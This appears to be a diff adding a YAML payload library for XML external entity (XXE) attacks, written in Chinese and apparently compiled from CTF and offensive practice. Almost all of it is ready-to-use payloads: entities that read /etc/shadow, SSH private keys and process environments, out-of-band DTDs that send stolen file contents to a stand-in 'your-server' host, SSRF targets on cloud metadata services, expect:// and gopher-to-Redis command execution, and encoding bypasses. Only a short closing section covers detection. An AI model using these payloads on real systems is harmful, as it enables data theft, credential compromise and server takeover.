@@ -1,0 +1,209 @@
+# XXE Payload 知识库
+# 来源: Des-CTF-Knowledge + Hunter 实战经验
+# 更新: 2026-06-02
+
+metadata:
+  category: xxe
+  description: "XXE (XML外部实体注入) Payload 集合"
+  version: "1.0"
+
+# ============================================
+# 1. 基础 XXE
+# ============================================
+basic:
+  description: "基础 XXE Payload"
+  file_read:
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <root>&xxe;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/hostname">
+      ]>
+      <root>&xxe;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///proc/version">
+      ]>
+      <root>&xxe;</root>
+  windows_file:
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
+      ]>
+      <root>&xxe;</root>
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+      ]>
+      <root>&xxe;</root>
+
+# ============================================
+# 2. Blind XXE (OOB)
+# ============================================
+blind_oob:
+  description: "无回显 XXE (带外数据)"
+  external_entity:
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % xxe SYSTEM "http://your-server/xxe.dtd">
+        %xxe;
+      ]>
+      <root>test</root>
+  external_dtd:
+    description: "外部 DTD 文件"
+    content: |
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://your-server/?data=%file;'>">
+      %eval;
+      %exfil;
+  parameter_entity:
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % xxe SYSTEM "http://your-server/xxe.dtd">
+        %xxe;
+      ]>
+      <root>test</root>
+
+# ============================================
+# 3. 参数实体 XXE
+# ============================================
+parameter_entity:
+  description: "参数实体 XXE"
+  basic:
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://your-server/?data=%file;'>">
+        %eval;
+        %exfil;
+      ]>
+      <root>test</root>
+  external_dtd:
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % xxe SYSTEM "http://your-server/evil.dtd">
+        %xxe;
+      ]>
+      <root>test</root>
+
+# ============================================
+# 4. XInclude XXE
+# ============================================
+xinclude:
+  description: "XInclude XXE"
+  payload:
+    - |
+      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+        <xi:include parse="text" href="file:///etc/passwd"/>
+      </foo>
+
+# ============================================
+# 5. SVG XXE
+# ============================================
+svg:
+  description: "SVG 文件 XXE"
+  payload:
+    - |
+      <?xml version="1.0" standalone="yes"?>
+      <!DOCTYPE test [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+        <text font-size="16" x="0" y="16">&xxe;</text>
+      </svg>
+
+# ============================================
+# 6. XXE 绕过
+# ============================================
+bypass:
+  description: "XXE 绕过技巧"
+  encoding:
+    - |
+      <?xml version="1.0" encoding="UTF-7"?>
+      +ADw-?xml version+AD0AIg-1.0+ACI encoding+AD0AIg-UTF-8+ACIAPgA8-+ACE-DOCTYPE foo +AFs-
+      +ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACIAPgA-
+      +AF0APgA8-root+AD4-+ACY-xxe+ADs-/root+AD4-
+  utf16:
+    description: "UTF-16 编码绕过"
+  cdata:
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <root><![CDATA[&xxe;]]></root>
+  nested:
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://your-server/?data=%file;'>">
+        %eval;
+        %exfil;
+      ]>
+      <root>test</root>
+
+# ============================================
+# 7. XXE 利用
+# ============================================
+exploitation:
+  description: "XXE 利用方法"
+  file_read:
+    - "file:///etc/passwd"
+    - "file:///etc/shadow"
+    - "file:///etc/hosts"
+    - "file:///etc/hostname"
+    - "file:///proc/version"
+    - "file:///proc/self/environ"
+    - "file:///proc/self/cmdline"
+    - "file:///root/.bash_history"
+    - "file:///root/.ssh/id_rsa"
+    - "file:///var/log/apache2/access.log"
+    - "file:///var/log/nginx/access.log"
+  ssrf:
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://metadata.google.internal/computeMetadata/v1/"
+    - "http://127.0.0.1/"
+    - "http://localhost/"
+  rce:
+    - "expect://id"
+    - "expect://ls"
+    - "gopher://127.0.0.1:6379/_{redis_commands}"
+
+# ============================================
+# 8. XXE 检测
+# ============================================
+detection:
+  description: "XXE 漏洞检测"
+  xml_content_type:
+    - "application/xml"
+    - "text/xml"
+    - "application/soap+xml"
+    - "application/rss+xml"
+    - "application/atom+xml"
+  test_payload:
+    - |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "http://your-dnslog/xxe">
+      ]>
+      <root>&xxe;</root>
+  error_messages:
+    - "XML parsing error"
+    - "DOMDocument::loadXML()"
+    - "SimpleXMLElement::__construct()"
+    - "XMLReader::XML()"
+    - "xml_parse()"
+    - "xml_parse_into_struct()"
